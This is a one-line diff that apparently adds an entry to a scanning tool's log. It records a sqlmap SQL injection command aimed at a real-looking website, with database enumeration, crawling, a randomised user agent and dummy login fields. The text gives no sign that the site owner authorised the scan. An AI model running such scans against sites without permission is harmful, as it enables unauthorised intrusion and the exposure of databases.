@@ -1,0 +1,1 @@
+https://estimators.us/blog/?avia-element-paging=2 (GET)  # E:\WebSecureX.(2)\engines\sqli_engine\sqlmap\sqlmap.py -u https://estimators.us/ --data=username=test&password=test --batch --random-agent --dbs --crawl=2 --threads=3 --level=1 --risk=1 --output-dir=E:\WebSecureX.(2)\python-backend\reports\a18a3dd9-adf7-4e13-ae96-523af8281bce\sqlmap
